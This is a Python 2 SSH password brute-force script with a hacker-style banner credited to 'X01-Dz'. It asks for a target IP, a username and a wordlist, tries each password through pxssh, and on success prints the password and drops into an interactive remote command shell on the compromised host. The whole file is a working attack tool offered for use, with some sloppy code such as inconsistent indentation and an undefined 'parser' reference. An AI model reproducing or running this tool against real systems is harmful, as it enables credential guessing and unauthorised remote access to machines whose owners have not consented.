# -*- coding: utf-8 -*- 
from pexpect import pxssh
import time
import os
os.system('clear')
print ('''\033[096m

▀█████████▄     ▄████████ ▀████    ▐████▀         ▄████████    ▄████████    ▄█    █▄    
  ███    ███   ███    ███   ███▌   ████▀         ███    ███   ███    ███   ███    ███   
  ███    ███   ███    █▀     ███  ▐███           ███    █▀    ███    █▀    ███    ███   
 ▄███▄▄▄██▀   ▄███▄▄▄        ▀███▄███▀           ███          ███         ▄███▄▄▄▄███▄▄ 
▀▀███▀▀▀██▄  ▀▀███▀▀▀        ████▀██▄          ▀███████████ ▀███████████ ▀▀███▀▀▀▀███▀  
  ███    ██▄   ███          ▐███  ▀███                  ███          ███   ███    ███   
  ███    ███   ███         ▄███     ███▄          ▄█    ███    ▄█    ███   ███    ███   
▄█████████▀    ███        ████       ███▄       ▄████████▀   ▄████████▀    ███    █▀ 
               
                      \033[091mCoded By X01-Dz
''')
def connect(host, user, password):
 	    Fails = 0

 	    try:
 		        s = pxssh.pxssh()
 		        s.login(host, user, password)
 		        print '[*] Password Found :\033[091m ' + password
 		        return s
 	    except Exception, e:	
 		        if Fails > 5:
 			            print '!!! Too Many Socket !'
 			            exit(0)
 		        elif 'read ' in str(e):
 		                Fails += 1
 		                time.sleep(1)
 		                return connect(host, user, password)
 		        elif 'synchronze with original ' in str(e):
 		                time.sleep(1) 
 		                return connect(host, user, password) 
 		        return None

def Main():
        host = raw_input('\033[091m[+]\033[090m Enter ip terget :\033[094m ')
        user = raw_input('\033[091m[+]\033[090m Enter user terget :\033[094m ')
        wordlist = raw_input('\033[091m[+]\033[090m Enter wordlist :\033[094m ')

        if host and user and wordlist:
                with open(wordlist, 'r') as infile:
                        for line in infile:
                                password = line.strip('\r\n')
                                print "\033[094mTesting: " + str(password)
                                con = connect(host, user, password)
                                if con:
                                 	    print "[SSH Connnect, Issue Commands {q or Q} to quit]"
                                            print ('')
                                 	    command = raw_input("\033[096mssh>")
                                 	    while command != 'q' and command != 'Q': 
                                 	            con.sendline(command)
                                 	            con.prompt()
                                 	            print con.before
                                 	            command = raw_input("\033[096mssh>")
        else:
                print parser.usage
                exit(0) 
if __name__ == '__main__':
        Main()                            	            
